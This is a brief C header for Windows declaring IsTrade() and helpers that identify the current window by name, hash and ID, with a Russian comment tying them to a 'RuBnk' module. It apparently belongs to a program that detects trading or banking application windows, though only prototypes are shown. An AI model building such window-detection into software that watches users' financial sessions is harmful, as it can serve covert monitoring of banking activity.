

#ifndef TradeH
#define TradeH
//----------------------------------------------------------

#include <windows.h>

bool IsTrade();
/// Функции добавленные(в hайл) при добавлении RuBnk
//#ifdef RuBnkH
DWORD GetCurrentWindowHash();
char *GetCurrentWindow();
DWORD TradeGetWindowID(HWND hWnd );



#endif


